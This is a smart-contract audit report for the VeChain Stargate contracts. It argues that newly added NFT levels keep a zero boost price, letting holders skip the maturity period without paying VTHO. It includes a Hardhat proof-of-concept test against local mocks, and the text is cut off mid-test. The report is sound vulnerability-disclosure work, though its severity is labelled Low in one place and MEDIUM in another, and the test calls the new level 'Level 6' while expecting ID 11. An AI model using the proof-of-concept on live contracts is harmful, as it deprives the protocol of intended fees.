# 60578 sc low zero boost fee for newly added levels lets users skip maturity for free and avoid paying intended vtho boost cost

**Submitted on Nov 24th 2025 at 07:22:10 UTC by @unineko for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60578
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/StargateNFT/StargateNFT.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief/Intro

In the current Stargate V3 codebase, any new NFT level added via `StargateNFT.addLevel` ends up with a `boostPricePerBlock` of 0 and there is no way to set a non-zero value for that level. As a result, holders of NFTs of newly added levels can always call boost and instantly skip the maturity period at zero VTHO cost, even though boosting is designed to require paying VTHO. This permanently underprices boosts for new levels, breaks the economic design around maturity, and allows users to keep VTHO that the protocol expects to collect as yield/fees.

***

## Vulnerability Details

### 1. New Levels Never Get a Non-Zero Boost Price

Levels are added via the `Levels.addLevel` library function, which is called from `StargateNFT.addLevel`:

```solidity
// StargateNFT/libraries/Levels.sol: Line 88-108
function addLevel(
    DataTypes.StargateNFTStorage storage $,
    DataTypes.LevelAndSupply memory _levelAndSupply
) external {
    $.MAX_LEVEL_ID++;
    _levelAndSupply.level.id = $.MAX_LEVEL_ID;

    // Store level metadata
    $.levels[_levelAndSupply.level.id] = _levelAndSupply.level;

    // ISSUE: $.boostPricePerBlock[_levelAndSupply.level.id] is never set here
}
```

**Key points:**

* `boostPricePerBlock` is a mapping in storage keyed by level ID
* Solidity default for `uint256` is 0, so every newly added level has `boostPricePerBlock[levelId] == 0` by default
* There is a library function to update this price:

```solidity
// Levels.sol: Line 180-186
function updateLevelBoostPricePerBlock(
    DataTypes.StargateNFTStorage storage $,
    uint8 _levelId,
    uint256 _boostPricePerBlock
) external {
    _updateLevelBoostPricePerBlock($, _levelId, _boostPricePerBlock);
}
```

However, `StargateNFT.sol` does not expose any public/external wrapper that calls this library for arbitrary levels. The only place where boost prices are configured is during initialization (`initializeV3`) for legacy levels, not for new levels added later.

**Effect**: For any level added after deployment via `StargateNFT.addLevel`, `boostPricePerBlock[levelId]` is locked to 0 and cannot be updated through the current public API.

***

### 2. Boost Price of 0 Implies requiredBoostAmount = 0

Boost cost is derived in the minting/boosting logic:

```solidity
// StargateNFT/libraries/MintingLogic.sol: Line 316-330
function _boostAmount(
    DataTypes.StargateNFTStorage storage $,
    uint256 _tokenId
) internal view returns (uint256) {
    uint64 maturityPeriodEndBlock = $.maturityPeriodEndBlock[_tokenId];
    if (Clock._clock() > maturityPeriodEndBlock) {
        return 0;
    }

    // ISSUE: If boostPricePerBlock[levelId] == 0, requiredBoostAmount is always 0
    return
        (maturityPeriodEndBlock - Clock._clock()) *
        $.boostPricePerBlock[$.tokens[_tokenId].levelId];
}
```

For a token of a newly added level:

* `$.tokens[_tokenId].levelId = newLevelId`
* `$.boostPricePerBlock[newLevelId] == 0`
* Therefore `requiredBoostAmount = (remainingBlocks * 0) = 0`

This is true as long as the token is still under the maturity period.

***

### 3. Zero-Cost Boost Path: Checks Bypassed, Maturity Reset

Boosting on behalf of a user is implemented as:

```solidity
// StargateNFT/libraries/MintingLogic.sol: Line 102-140
function boostOnBehalfOf(
    DataTypes.StargateNFTStorage storage $,
    address _sender,
    uint256 _tokenId
) external {
    uint256 requiredBoostAmount = _boostAmount($, _tokenId); // 0 for new levels

    if ($.vthoToken.balanceOf(_sender) < requiredBoostAmount) {
        revert InsufficientBalance(...);
    }

    if (allowance < requiredBoostAmount) {
        revert InsufficientAllowance(...);
    }

    // requiredBoostAmount == 0 => these checks are never triggered

    $.vthoToken.safeTransferFrom(_sender, address(0), requiredBoostAmount);
    // Note: VeChain VTHO is VIP-180 compliant and does not revert on transfers to address(0)
    // Unlike standard ERC20 (OpenZeppelin v4), VIP-180 spec does not require this check
    // requiredBoostAmount == 0 => this transfer succeeds without reverting

    // Maturity is immediately skipped
    $.maturityPeriodEndBlock[_tokenId] = Clock._clock();
}
```

**User-facing flow (simplified):**

1. User calls `Stargate.boost(tokenId)` (or an equivalent function), which internally calls `StargateNFT.boostOnBehalfOf(msg.sender, tokenId)`
2. For tokens of newly added levels:
   * `requiredBoostAmount == 0`
   * Balance/allowance checks are effectively disabled (`x < 0` is false)
   * `safeTransferFrom(sender, address(0), 0)` succeeds
   * `maturityPeriodEndBlock[tokenId]` is set to the current block

**Result**: Any holder of a token of a newly added level can always boost for free and instantly end the maturity period.

***

### 4. Attacker/User Flow

**Role assumptions:**

* `LEVEL_OPERATOR_ROLE` is held by protocol admins and is used to add new levels
* Regular users have no special roles

**The problematic path:**

1. Admin (with `LEVEL_OPERATOR_ROLE`) adds a new level via `StargateNFT.addLevel(...)`
2. There is no way in the current code to set a non-zero `boostPricePerBlock` for that new level
3. A regular user mints an NFT of that level via stake/stakeAndDelegate/migrate path
4. The token starts with a non-zero maturity period
5. The user calls `boost(tokenId)` (or a UI function that routes to `boostOnBehalfOf`)
6. `requiredBoostAmount == 0`
7. No VTHO is spent
8. `maturityPeriodEndBlock[tokenId]` is set to `block.number`, immediately ending the maturity period
9. The user can then delegate and start earning rewards immediately, without paying the configured VTHO boost cost that applies to existing levels

This pattern is deterministic for every token of every new level added in the future.

***

## Impact Details

### Chosen Impacts

#### 1. Contract fails to deliver promised returns, but doesn't lose value

Boosting for existing levels is designed to require VTHO payment proportional to the remaining maturity period. For newly added levels, this invariant silently breaks: users can get the same "boost" effect (skip the maturity lock and access rewards earlier) at zero cost.

**Consequences:**

* The economic model around maturity and boosting is inconsistent across levels
* If the docs/UI communicate that boost always costs VTHO, the implementation fails to deliver the promised fee structure
* Early access to rewards for new-level holders is effectively subsidized by the protocol relative to existing levels

#### 2. Theft of unclaimed yield

From the protocol's perspective, boost fees are a form of yield/fee income: users should pay VTHO in exchange for shortening their maturity lock. Because `boostPricePerBlock` is permanently 0 for new levels:

* For any token of a new level, the user keeps all their VTHO while still receiving the benefit of early unlocking
* Across all such tokens and boosts, the protocol permanently loses all expected VTHO fee income associated with boosting for those levels
* This is a systematic and unbounded loss of protocol-side yield for all newly added levels

### Scope/Severity Arguments

* The issue affects every newly added level after deployment
* There is no way in the current public API to configure a non-zero boost price for those levels
* Users can repeat the free-boost pattern for every token of the affected levels
* No user funds are stolen or frozen, but protocol economics and promised fee mechanics are clearly broken for new levels
* Code analysis confirms this vulnerability is deterministically exploitable for all newly added levels

Given the Immunefi impact definitions, this aligns best with:

* "Contract fails to deliver promised returns, but doesn't lose value"
* "Theft of unclaimed yield" (protocol-side VTHO boost fees that should be collected but are always bypassed for new levels)

***

## References

### Contract References

#### contracts/StargateNFT/StargateNFT.sol

* `addLevel(...)` (calls `Levels.addLevel`)

#### contracts/StargateNFT/libraries/Levels.sol

* `addLevel(...)` - sets level metadata but never sets `boostPricePerBlock` for new levels
* `updateLevelBoostPricePerBlock(...)` - exists as a library function but has no public wrapper in `StargateNFT.sol`

#### contracts/StargateNFT/libraries/MintingLogic.sol

* `_boostAmount(...)` - computes `requiredBoostAmount` as `remainingBlocks * boostPricePerBlock[levelId]`
* `boostOnBehalfOf(...)` - calls `_boostAmount`, checks `balance < requiredBoostAmount` and `allowance < requiredBoostAmount`, then performs `safeTransferFrom(sender, address(0), requiredBoostAmount)` and sets `maturityPeriodEndBlock[tokenId] = Clock._clock()`

## Proof of Concept

npx hardhat test --network hardhat test/unit/PoC/002\_M1\_PoC.test.ts --show-stack-traces

```solidity
import { expect } from "chai";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { setBalance, setCode } from "@nomicfoundation/hardhat-network-helpers";
import { getOrDeployContracts } from "../../helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { mineBlocks } from "../../helpers/common";
import type { Stargate, StargateNFT, ProtocolStakerMock, MyERC20 } from "../../../typechain-types";
import { MyERC20__factory, ProtocolStakerMock__factory } from "../../../typechain-types";

/**
 * ===============================================================================
 * VEC-STG-002: ZERO BOOST FEE POC
 * ===============================================================================
 *
 * [CLASSIFICATION] IMMUNEFI CLASSIFICATION:
 * - Severity: MEDIUM
 * - Primary Impact: Contract fails to deliver promised returns
 * - Secondary Impact: Theft of unclaimed yield (protocol-side VTHO boost fees)
 *
 * [OVERVIEW] VULNERABILITY SUMMARY:
 *
 * New NFT levels added via StargateNFT.addLevel() after deployment have their
 * boostPricePerBlock permanently set to 0, and there is no public API to change
 * this value. As a result:
 *
 * 1. MintingLogic._boostAmount() returns 0 for tokens of new levels
 * 2. Users can call boost() without paying any VTHO
 * 3. Maturity period is instantly skipped at zero cost
 * 4. Protocol loses all expected VTHO boost fee income for new levels
 *
 * This PoC demonstrates:
 * - Adding a new level (Level 6) with maturityBlocks = 1000
 * - boostPricePerBlock[6] remains 0 (cannot be set)
 * - User boosts for FREE (0 VTHO spent)
 * - Maturity period instantly skipped
 * - Token can be delegated immediately without VTHO payment
 *
 * [VULNERABILITY DETAILS] CODE REFERENCES:
 *
 * 1. Levels.sol:88-125 - addLevel() doesn't set boostPricePerBlock
 * 2. Levels.sol:180-186 - updateLevelBoostPricePerBlock() is library function with no public wrapper
 * 3. MintingLogic.sol:316-330 - _boostAmount() returns 0 when boostPricePerBlock[levelId] == 0
 * 4. MintingLogic.sol:102-146 - boostOnBehalfOf() accepts requiredBoostAmount = 0
 *
 * ===============================================================================
 */

describe("VEC-STG-002: Zero Boost Fee for Newly Added Levels", () => {
    let deployer: HardhatEthersSigner;
    let user: HardhatEthersSigner;
    let otherAccounts: HardhatEthersSigner[];

    let protocolStakerContract: ProtocolStakerMock;
    let stargateContract: Stargate;
    let stargateNFTContract: StargateNFT;
    let vthoToken: MyERC20;

    const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";

    /**
     * ============================================================================
     * SETUP PHASE (STEPS 1-6)
     * ============================================================================
     */
    before(async () => {
        console.log("\n[CLASSIFICATION] VEC-STG-002: Zero Boost Fee Vulnerability PoC");
        console.log("[SEVERITY] MEDIUM");
        console.log(
            "[IMPACT] Contract fails to deliver promised returns + Theft of unclaimed yield"
        );
        console.log("\n" + "=".repeat(80));
        console.log("SETUP PHASE - INITIAL STATE PREPARATION");
        console.log("=".repeat(80) + "\n");

        // ========================================================================
        // STEP 1: DEPLOY CONTRACTS
        // ========================================================================
        console.log("[STEP 1] Deploying all contracts...");

        // Get deployer first
        [deployer, ...otherAccounts] = await ethers.getSigners();
        [user] = otherAccounts;
        await setBalance(deployer.address, ethers.parseEther("50000000"));

        // Manually deploy ProtocolStakerMock
        protocolStakerContract = await new ProtocolStakerMock__factory(deployer).deploy();
        await protocolStakerContract.waitForDeployment();

        // Deploy other contracts with the mock
        const config = createLocalConfig();
        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerContract.getAddress();

        const {
            stargateContract: sc,
            stargateNFTContract: snc,
            mockedVthoToken: vtho,
        } = await getOrDeployContracts({
            forceDeploy: true,
            config: config,
            mintVtho: true,
        });

        stargateContract = sc;
        stargateNFTContract = snc;
        vthoToken = vtho;

        // Set sufficient VET balance for deployer and user
        await setBalance(deployer.address, ethers.parseEther("50000000"));
        await setBalance(user.address, ethers.parseEther("50000000"));

        // Setup VTHO mock using MyERC20
        const myERC20 = await new MyERC20__factory(deployer).deploy(
            deployer.address,
            deployer.address
        );
        await myERC20.waitForDeployment();

        // Copy MyERC20 bytecode to VTHO address
        const myERC20Bytecode = await ethers.provider.getCode(await myERC20.getAddress());
        await setCode(VTHO_TOKEN_ADDRESS, myERC20Bytecode);

        // Mint VTHO tokens to deployer and user
        vthoToken = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);
        await vthoToken.mint(deployer.address, ethers.parseEther("1000000"));
        await vthoToken.mint(user.address, ethers.parseEther("1000000"));
        await vthoToken.mint(await stargateContract.getAddress(), ethers.parseEther("1000000"));

        console.log(
            `  [OK] ProtocolStakerMock deployed at: ${await protocolStakerContract.getAddress()}`
        );
        console.log(`  [OK] Stargate deployed at: ${await stargateContract.getAddress()}`);
        console.log(`  [OK] StargateNFT deployed at: ${await stargateNFTContract.getAddress()}`);
        console.log(`  [OK] VTHO Token at: ${VTHO_TOKEN_ADDRESS}`);

        // Verify deployer and user have sufficient VET balance
        const deployerBalance = await ethers.provider.getBalance(deployer.address);
        const userBalance = await ethers.provider.getBalance(user.address);
        console.log(`  [OK] Deployer VET balance: ${ethers.formatEther(deployerBalance)} VET`);
        console.log(`  [OK] User VET balance: ${ethers.formatEther(userBalance)} VET`);

        expect(deployerBalance).to.be.gte(
            ethers.parseEther("10000000"),
            "Deployer needs at least 10M VET"
        );
        expect(userBalance).to.be.gte(ethers.parseEther("10000000"), "User needs at least 10M VET");

        // ========================================================================
        // STEP 2: GRANT LEVEL_OPERATOR_ROLE
        // ========================================================================
        console.log("\n[STEP 2] Granting LEVEL_OPERATOR_ROLE to Deployer...");

        const LEVEL_OPERATOR_ROLE = await stargateNFTContract.LEVEL_OPERATOR_ROLE();
        const hasRoleBefore = await stargateNFTContract.hasRole(
            LEVEL_OPERATOR_ROLE,
            deployer.address
        );

        if (!hasRoleBefore) {
            await stargateNFTContract
                .connect(deployer)
                .grantRole(LEVEL_OPERATOR_ROLE, deployer.address);
            console.log(`  [OK] LEVEL_OPERATOR_ROLE granted to Deployer`);
        } else {
            console.log(`  [OK] LEVEL_OPERATOR_ROLE already granted to Deployer`);
        }

        const hasRoleAfter = await stargateNFTContract.hasRole(
            LEVEL_OPERATOR_ROLE,
            deployer.address
        );
        expect(hasRoleAfter).to.be.true;

        // ========================================================================
        // STEP 3: RECORD EXISTING LEVELS AND BOOST PRICES
        // ========================================================================
        console.log("\n[STEP 3] Recording existing levels and boost prices...");

        const existingLevelIds = await stargateNFTContract.getLevelIds();
        console.log(`  [OK] Existing Level IDs: [${existingLevelIds.join(", ")}]`);

        console.log(`\n  [STATE] EXISTING LEVEL BOOST PRICES:`);
        for (const levelId of existingLevelIds) {
            const boostPrice = await stargateNFTContract.boostPricePerBlock(levelId);
            const level = await stargateNFTContract.getLevel(levelId);
            console.log(
                `    Level ${levelId}: ${ethers.formatEther(boostPrice)} VTHO/block (maturity: ${level.maturityBlocks} blocks)`
            );

            // [INVARIANT] All existing levels should have non-zero boost price if they have maturity
            if (level.maturityBlocks > 0) {
                expect(boostPrice).to.be.gt(
                    0,
                    `Level ${levelId} has maturity but zero boost price`
                );
            }
        }

        // Verify StargateNFT is using the correct VTHO token address
        const onchainVthoAddress = await stargateNFTContract.getVthoTokenAddress();
        expect(onchainVthoAddress).to.equal(VTHO_TOKEN_ADDRESS);
        console.log(`\n  [OK] StargateNFT vthoToken address matches: ${VTHO_TOKEN_ADDRESS}`);
        console.log(`  [OK] Test VTHO mock is observing the actual business logic token`);

        // Setup User VTHO balance and allowance
        const userVthoBalance = await vthoToken.balanceOf(user.address);
        console.log(`\n  [OK] User VTHO balance: ${ethers.formatEther(userVthoBalance)} VTHO`);
        expect(userVthoBalance).to.be.gte(ethers.parseEther("10"), "User needs at least 10 VTHO");

        // Approve StargateNFT to spend User's VTHO
        const stargateNFTAddress = await stargateNFTContract.getAddress();
        await vthoToken.connect(user).approve(stargateNFTAddress, ethers.parseEther("100000"));

        const allowance = await vthoToken.allowance(user.address, stargateNFTAddress);
        console.log(
            `  [OK] User VTHO allowance to StargateNFT: ${ethers.formatEther(allowance)} VTHO`
        );
        expect(allowance).to.equal(ethers.parseEther("100000"));
    });

    /**
     * ============================================================================
     * MAIN POC TEST: DEMONSTRATE ZERO BOOST FEE VULNERABILITY
     * ============================================================================
     */
    it("should demonstrate zero boost fee vulnerability for newly added levels", async () => {
        console.log("\n" + "=".repeat(80));
        console.log("ATTACK PHASE - DEMONSTRATING ZERO BOOST FEE BUG");
        console.log("=".repeat(80) + "\n");

        // ========================================================================
        // STEP 4: ADD NEW LEVEL WITH NON-ZERO MATURITY PERIOD
        // ========================================================================
        console.log("[STEP 4] Adding new Level 6 with maturityBlocks = 1000...");

        const newLevel = {
            level: {
                id: 0, // Will be set to MAX_LEVEL_ID + 1 by addLevel()
                name: "Vulnerable Level",
                isX: false,
                vetAmountRequiredToStake: ethers.parseEther("100000"), // 100K VET
                scaledRewardFactor: 100, // 1.0x reward
                maturityBlocks: 1000, // [CRITICAL] Non-zero maturity period
            },
            cap: 100,
            circulatingSupply: 0,
        };

        const addLevelTx = await stargateNFTContract.connect(deployer).addLevel(newLevel);
        await addLevelTx.wait();

        const newLevelIds = await stargateNFTContract.getLevelIds();
        const newLevelId = newLevelIds[newLevelIds.length - 1];
        console.log(`  [OK] New Level ID: ${newLevelId}`);
        expect(newLevelId).to.equal(11n, "Expected new level to be added as ID 11");

        const levelDetails = await stargateNFTContract.getLevel(newLevelId);
        console.log(`  [OK] New Level name: "${levelDetails.name}"`);
        console.log(
            `  [OK] New Level vetAmountRequiredToStake: ${ethers.formatEther(levelDetails.vetAmountRequiredToStake)} VET`
        );
        console.log(`  [OK] New Level maturityBlocks: ${levelDetails.maturityBlocks} blocks`);
        console.log(`  [OK] New Level scaledRewardFactor: ${levelDetails.scaledRewardFactor}`);

        // ========================================================================
        // STEP 5: [CRITICAL] VERIFY boostPricePerBlock[newLevelId] == 0 (BUG CONFIRMATION)
        // ========================================================================
        console.log("\n[STEP 5] [CRITICAL] Verifying boostPricePerBlock[6] == 0 (BUG)...");

        const level6BoostPrice = await stargateNFTContract.boostPricePerBlock(newLevelId);
        console.log(`  [CRITICAL] Level 6 boostPricePerBlock: ${level6BoostPrice} VTHO/block`);
        console.log(`  [CRITICAL] Expected: NON-ZERO (for maturity-enabled levels)`);
        console.log(`  [CRITICAL] Actual: 0 (BUG - addLevel() doesn't set boost price)`);

        // This assertion CONFIRMS the vulnerability
        expect(level6BoostPrice).to.equal(
            0n,
            "[BUG CONFIRMATION] boostPricePerBlock should be non-zero but is 0"
        );

        console.log(`  [ALERT] VULNERABILITY CONFIRMED:`);
        console.log(`    -> Levels.addLevel() does NOT set boostPricePerBlock`);
        console.log(`    -> No public wrapper exists for updateLevelBoostPricePerBlock()`);
        console.log(`    -> Level 6 boost price is PERMANENTLY 0`);

        // ========================================================================
        // STEP 6: MINT NFT OF NEW LEVEL (LEVEL 6)
        // ========================================================================
        console.log("\n[STEP 6] User stakes 100K VET to mint Level 6 NFT...");

        const stakeTx = await stargateContract
            .connect(user)
            .stake(newLevelId, { value: ethers.parseEther("100000") });
        const stakeReceipt = await stakeTx.wait();

        // Extract tokenId from Transfer event
        const transferEvent = stakeReceipt?.logs.find(
            (log) => log.topics[0] === stargateNFTContract.interface.getEvent("Transfer")!.topicHash
        );
        expect(transferEvent, "Transfer event not found").to.exist;
        const tokenId = BigInt(transferEvent!.topics[3]);
        console.log(`  [OK] Minted Token ID: ${tokenId}`);

        const tokenOwner = await stargateNFTContract.ownerOf(tokenId);
        expect(tokenOwner).to.equal(user.address);
        console.log(`  [OK] Token owner: ${tokenOwner}`);
        console.log(`  [OK] Token levelId: ${newLevelId}`);

        const maturityPeriodEndBlock = await stargateNFTContract.maturityPeriodEndBlock(tokenId);
        const currentBlock = await ethers.provider.getBlockNumber();
        console.log(`  [OK] Current block: ${currentBlock}`);
        console.log(`  [OK] Maturity end block: ${maturityPeriodEndBlock}`);
        console.log(`  [OK] Remaining blocks: ${maturityPeriodEndBlock - BigInt(currentBlock)}`);

        expect(maturityPeriodEndBlock).to.be.gt(currentBlock, "Token should be in maturity period");

        // ========================================================================
        // STEP 7: CALCULATE EXPECTED BOOST AMOUNT (EXPECT 0)
        // ========================================================================
        console.log("\n[STEP 7] Calculating expected boost amount...");

        const remainingBlocks = maturityPeriodEndBlock - BigInt(currentBlock);
        const boostPricePerBlock = await stargateNFTContract.boostPricePerBlock(newLevelId);
        const expectedBoostAmount = remainingBlocks * boostPricePerBlock;

        console.log(`  [STATE] Remaining blocks: ${remainingBlocks}`);
        console.log(
            `  [STATE] Boost price per block: ${ethers.formatEther(boostPricePerBlock)} VTHO`
        );
        console.log(
            `  [STATE] Expected boost amount: ${ethers.formatEther(expectedBoostAmount)} VTHO`
        );

        console.log(`  [CRITICAL] Expected boost amount is 0 because:`);
        console.log(`    -> boostPricePerBlock[6] = 0`);
        console.log(`    -> ${remainingBlocks} blocks * 0 VTHO/block = 0 VTHO`);

        expect(expectedBoostAmount).to.equal(0n, "[BUG] Expected boost amount should be non-zero");

        // ========================================================================
        // STEP 8: RECORD USER VTHO BALANCE BEFORE BOOST
        // ========================================================================
        console.log("\n[STEP 8] Recording User VTHO balance before boost...");

        const vthoBalanceBefore = await vthoToken.balanceOf(user.address);
        console.log(`  [STATE] User VTHO balance: ${ethers.formatEther(vthoBalanceBefore)} VTHO`);
        expect(vthoBalanceBefore).to.be.gte(
            ethers.parseEther("10"),
            "User should have sufficient VTHO"
        );

        // ========================================================================
        // STEP 9: VERIFY VTHO ALLOWANCE IS SET
        // ========================================================================
        console.log("\n[STEP 9] Verifying VTHO allowance to StargateNFT...");

        const stargateNFTAddress = await stargateNFTContract.getAddress();
        const allowance = await vthoToken.allowance(user.address, stargateNFTAddress);
        console.log(`  [STATE] User VTHO allowance: ${ethers.formatEther(allowance)} VTHO`);
        expect(allowance).to.be.gte(ethers.parseEther("10"), "Allowance should be sufficient");

        // ========================================================================
        // STEP 10: [CRITICAL] BOOST FOR FREE (BUG TRIGGER)
        // ========================================================================
        console.log("\n[STEP 10] [CRITICAL] Calling boost() - expecting FREE boost...");

        console.log(`  [ALERT] Triggering boost for Token ID ${tokenId}...`);
        console.log(`  [ALERT] Expected behavior (BUG):`);
        console.log(`    -> MintingLogic._boostAmount() returns 0`);
        console.log(`    -> balance < requiredBoostAmount (0): always false -> check bypassed`);
        console.log(`    -> allowance < requiredBoostAmount (0): always false -> check bypassed`);
        console.log(`    -> vthoToken.safeTransferFrom(user, address(0), 0): SUCCESS`);
        console.log(`    -> maturityPeriodEndBlock[tokenId] = block.number: UPDATED`);
        console.log(`    -> Transaction: SUCCESS (no revert)`);

        const boostTx = await stargateNFTContract.connect(user).boost(tokenId);
        const boostReceipt = await boostTx.wait();

        expect(boostReceipt?.status).to.equal(1, "Boost transaction should succeed");
        console.log(`  [SUCCESS] Boost transaction succeeded!`);
        console.log(`  [OK] Gas used: ${boostReceipt?.gasUsed}`);

        // ========================================================================
        // STEP 11: VERIFY SUCCESS - NO VTHO SPENT, MATURITY INSTANTLY SKIPPED
        // ========================================================================
        console.log("\n[STEP 11] Verifying boost results...");

        // 11-1: Verify User VTHO balance is unchanged
        const vthoBalanceAfter = await vthoToken.balanceOf(user.address);
        console.log(
            `  [STATE] User VTHO balance after boost: ${ethers.formatEther(vthoBalanceAfter)} VTHO`
        );
        console.log(
            `  [STATE] User VTHO balance before boost: ${ethers.formatEther(vthoBalanceBefore)} VTHO`
        );
        console.log(
            `  [STATE] VTHO spent: ${ethers.formatEther(vthoBalanceBefore - vthoBalanceAfter)} VTHO`
        );

        console.log(`  [CRITICAL] VTHO SPENT: 0 VTHO (BUG - should have paid non-zero amount)`);
        expect(vthoBalanceAfter).to.equal(
            vthoBalanceBefore,
            "[BUG] User should have spent VTHO but didn't"
        );

        // 11-2: Verify maturity period is instantly skipped
        const maturityPeriodEndBlockAfter =
            await stargateNFTContract.maturityPeriodEndBlock(tokenId);
        const currentBlockAfter = await ethers.provider.getBlockNumber();
        console.log(`  [STATE] Maturity end block after boost: ${maturityPeriodEndBlockAfter}`);
        console.log(`  [STATE] Current block after boost: ${currentBlockAfter}`);

        console.log(`  [CRITICAL] MATURITY PERIOD INSTANTLY SKIPPED:`);
        console.log(`    -> Before boost: maturity ends at block ${maturityPeriodEndBlock}`);
        console.log(`    -> After boost: maturity ends at block ${maturityPeriodEndBlockAfter}`);
        console.log(`    -> Current block: ${currentBlockAfter}`);
        console.log(`    -> Token is now MATURE (can be delegated immediately)`);

        expect(maturityPeriodEndBlockAfter).to.equal(
            currentBlockAfter,
            "Maturity should be set to current block"
        );

        const isMatured = BigInt(currentBlockAfter) >= maturityPeriodEndBlockAfter;
        expect(isMatured).to.be.true;

        console.log("\n" + "=".repeat(80));
        console.log("VERIFICATION PHASE - CONFIRMING VULNERABILITY IMPACT");
        console.log("=".repeat(80) + "\n");

        // ========================================================================
        // STEP 12: VERIFY TOKEN CAN BE DELEGATED IMMEDIATELY
        // ========================================================================
        console.log("[STEP 12] Verifying token can be delegated immediately...");

        // Use deployer as validator
        const validator = deployer.address;
        console.log(`  [OK] Using validator: ${validator}`);

        // Setup validator in ProtocolStaker
        await protocolStakerContract.addValidation(validator, 120);
        await protocolStakerContract.helper__setValidatorStatus(validator, 2); // ACTIVE

        const delegateTx = await stargateContract.connect(user).delegate(tokenId, validator);
        const delegateReceipt = await delegateTx.wait();

        expect(delegateReceipt?.status).to.equal(1, "Delegation should succeed");
        console.log(`  [SUCCESS] Delegation succeeded immediately after free boost!`);

        const delegationDetails = await stargateContract.getDelegationDetails(tokenId);
        console.log(`  [OK] Delegation validator: ${delegationDetails.validator}`);
        expect(delegationDetails.validator).to.equal(validator);

        // ========================================================================
        // STEP 13: COMPARE WITH EXISTING LEVEL BOOST COST
        // ========================================================================
        console.log("\n[STEP 13] Comparing with existing level boost costs...");

        const existingLevelIds = await stargateNFTContract.getLevelIds();
        const comparisonLevelId = existingLevelIds[0]; // Use Level 1 for comparison

        const level1BoostPrice = await stargateNFTContract.boostPricePerBlock(comparisonLevelId);
        const level1 = await stargateNFTContract.getLevel(comparisonLevelId);
        const level1MaturityBlocks = level1.maturityBlocks;

        const level1TotalBoostCost = level1BoostPrice * level1MaturityBlocks;
        console.log(`\n  [STATE] BOOST COST COMPARISON:`);
        console.log(`    Level ${comparisonLevelId} (existing):`);
        console.log(`      -> Boost price per block: ${ethers.formatEther(level1BoostPrice)} VTHO`);
        console.log(`      -> Maturity blocks: ${level1MaturityBlocks}`);
        console.log(`      -> Total boost cost: ${ethers.formatEther(level1TotalBoostCost)} VTHO`);
        console.log(`    Level ${newLevelId} (new):`);
        console.log(`      -> Boost price per block: 0 VTHO`);
        console.log(`      -> Maturity blocks: ${levelDetails.maturityBlocks}`);
        console.log(`      -> Total boost cost: 0 VTHO`);

        const level6BoostCost = 0n;
        console.log(`\n  [IMPACT] ECONOMIC LOSS:`);
        console.log(`    -> Expected behavior: boostPricePerBlock should be NON-ZERO for maturity-enabled levels`);
        console.log(
            `    -> Reference (Level ${comparisonLevelId}): ${ethers.formatEther(level1TotalBoostCost)} VTHO per boost`
        );
        console.log(`    -> Actual revenue for Level ${newLevelId}: 0 VTHO`);
        console.log(
            `    -> Protocol loss per boost (using Level ${comparisonLevelId} as baseline): ${ethers.formatEther(level1TotalBoostCost)} VTHO`
        );
        console.log(`    -> This loss occurs for EVERY boost on EVERY new level`);
        console.log(`    -> Note: New levels should have their own appropriate non-zero boost price`);

        expect(level6BoostCost).to.equal(0n);
        expect(level1TotalBoostCost).to.be.gt(0n);

        // ========================================================================
        // FINAL SUMMARY
        // ========================================================================
        console.log("\n" + "=".repeat(80));
        console.log("VULNERABILITY CONFIRMED - SUMMARY");
        console.log("=".repeat(80) + "\n");

        console.log("[INVARIANT] BROKEN INVARIANTS:");
        console.log("  1. BoostEconomics Invariant:");
        console.log(
            "     -> Expected: forall levels with maturityBlocks > 0, boostPricePerBlock > 0"
        );
        console.log("     -> Actual: Level 6 has maturityBlocks = 1000 but boostPricePerBlock = 0");
        console.log("     -> VIOLATED");
        console.log("\n  2. MaturityRequiresPayment Invariant:");
        console.log("     -> Expected: Skipping maturity period requires VTHO payment");
        console.log("     -> Actual: Token maturity skipped with 0 VTHO payment");
        console.log("     -> VIOLATED");

        console.log("\n[IMPACT] VULNERABILITY IMPACT:");
        console.log("  1. Contract fails to deliver promised returns:");
        console.log("     -> Boost mechanism designed to require VTHO payment");
        console.log("     -> New levels bypass this payment requirement entirely");
        console.log("     -> Economic model is inconsistent across levels");
        console.log("\n  2. Theft of unclaimed yield:");
        console.log("     -> Protocol expects VTHO boost fees as yield/income");
        console.log("     -> All boost fees for new levels are permanently lost (0 VTHO)");
        console.log("     -> Systematic and unbounded loss for all future new levels");

        console.log("\n[CLASSIFICATION] IMMUNEFI CLASSIFICATION:");
        console.log("  -> Severity: MEDIUM");
        console.log("  -> Primary Impact: Contract fails to deliver promised returns");
        console.log("  -> Secondary Impact: Theft of unclaimed yield");

        console.log("\n[PASSED] VEC-STG-002 POC SUCCESSFULLY DEMONSTRATED!");
        console.log("=".repeat(80) + "\n");
    });

    /**
     * ============================================================================
     * CONTROL TEST: VERIFY EXISTING LEVELS REQUIRE VTHO PAYMENT
     * ============================================================================
     */
    it("(CONTROL) should require VTHO payment for existing levels with non-zero boost price", async () => {
        console.log("\n" + "=".repeat(80));
        console.log("CONTROL TEST - EXISTING LEVELS REQUIRE VTHO PAYMENT");
        console.log("=".repeat(80) + "\n");

        console.log("[CONTROL] This test verifies that existing levels (Level 1-5) work correctly");
        console.log(
            "[CONTROL] and require VTHO payment for boost, unlike the vulnerable new levels"
        );

        // Get Level 1 for control test
        const controlLevelId = 1n;
        const controlLevel = await stargateNFTContract.getLevel(controlLevelId);
        const controlBoostPrice = await stargateNFTContract.boostPricePerBlock(controlLevelId);

        console.log(`\n[STATE] Control Level ${controlLevelId} parameters:`);
        console.log(`  -> Boost price per block: ${ethers.formatEther(controlBoostPrice)} VTHO`);
        console.log(`  -> Maturity blocks: ${controlLevel.maturityBlocks}`);
        console.log(
            `  -> VET required to stake: ${ethers.formatEther(controlLevel.vetAmountRequiredToStake)} VET`
        );

        // Verify Level 1 has non-zero boost price
